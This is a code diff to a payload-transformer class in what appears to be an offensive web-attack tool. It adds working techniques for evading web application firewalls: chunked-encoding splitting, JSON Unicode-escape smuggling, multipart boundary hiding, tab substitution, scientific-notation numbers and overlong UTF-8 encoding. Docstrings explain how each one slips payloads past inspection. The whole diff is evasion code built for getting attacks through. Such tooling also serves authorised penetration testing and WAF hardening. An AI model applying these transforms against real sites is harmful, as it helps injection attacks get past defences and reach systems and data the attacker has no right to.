@@ -71,6 +71,9 @@ class PayloadTransformer:
         "unicode_encode", "null_byte_injection",
         "mysql_comment_bypass", "concat_obfuscation",
         "parameter_pollution",
+        "chunked_transfer", "json_smuggle",
+        "multipart_boundary", "tab_substitution",
+        "scientific_notation", "overlong_utf8",
     ]
 
     def transform(self, payload: str, techniques: List[str] = None) -> List[str]:
@@ -210,6 +213,91 @@ class PayloadTransformer:
         split on.
         """
         return f"harmless|||{payload}"
+
+    def _apply_chunked_transfer(self, payload: str) -> str:
+        """Split payload into chunked transfer-encoding style fragments.
+
+        Some WAFs fail to reassemble chunked bodies before inspection,
+        allowing split payloads to bypass pattern matching.
+        """
+        if len(payload) < 4:
+            return payload
+        chunk_size = max(2, len(payload) // 3)
+        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
+        return "\r\n".join(f"{len(c):x}\r\n{c}" for c in chunks) + "\r\n0\r\n\r\n"
+
+    def _apply_json_smuggle(self, payload: str) -> str:
+        """Wrap payload in a JSON structure with Unicode escapes.
+
+        WAFs that don't deeply parse JSON bodies may miss payloads hidden
+        inside JSON string values with Unicode escape sequences.
+        """
+        escaped = "".join(f"\\u{ord(c):04x}" for c in payload)
+        return f'{{"data":"{escaped}"}}'
+
+    def _apply_multipart_boundary(self, payload: str) -> str:
+        """Wrap payload in a multipart/form-data boundary.
+
+        WAFs that only inspect the first boundary or don't parse multipart
+        bodies may miss the payload embedded in a subsequent part.
+        """
+        boundary = f"----VenomStrike{random.randint(10000, 99999)}"
+        return (
+            f"--{boundary}\r\n"
+            f"Content-Disposition: form-data; name=\"benign\"\r\n\r\n"
+            f"safe_value\r\n"
+            f"--{boundary}\r\n"
+            f"Content-Disposition: form-data; name=\"input\"\r\n\r\n"
+            f"{payload}\r\n"
+            f"--{boundary}--"
+        )
+
+    def _apply_tab_substitution(self, payload: str) -> str:
+        """Replace spaces with horizontal tabs.
+
+        Tabs (``\\t``) are treated as whitespace by most interpreters but
+        some WAF regex patterns only match literal spaces.
+        """
+        return payload.replace(" ", "\t")
+
+    def _apply_scientific_notation(self, payload: str) -> str:
+        """Replace integer literals with scientific notation equivalents.
+
+        For example, ``1`` becomes ``1e0`` and ``100`` becomes ``1e2``.
+        WAFs pattern-matching on specific numeric values may miss these.
+        """
+        def _to_scientific(m: re.Match) -> str:
+            val = int(m.group())
+            if val == 0:
+                return "0e0"
+            import math
+            exp = int(math.log10(abs(val))) if val != 0 else 0
+            mantissa = val / (10 ** exp) if exp > 0 else val
+            return f"{mantissa}e{exp}"
+        return re.sub(r"\b(\d+)\b", _to_scientific, payload)
+
+    def _apply_overlong_utf8(self, payload: str) -> str:
+        """Encode characters using overlong UTF-8 sequences.
+
+        Some WAFs normalise standard UTF-8 but fail to handle overlong
+        (non-shortest-form) encodings, allowing payloads to slip through.
+        Characters ``<``, ``>``, ``'``, ``"``, ``/`` are converted to their
+        two-byte overlong form.
+        """
+        overlong_map = {
+            "<": "%c0%bc",
+            ">": "%c0%be",
+            "'": "%c0%a7",
+            '"': "%c0%a2",
+            "/": "%c0%af",
+        }
+        result = []
+        for ch in payload:
+            if ch in overlong_map:
+                result.append(overlong_map[ch])
+            else:
+                result.append(ch)
+        return "".join(result)
 
 
 class AdaptiveThrottle:
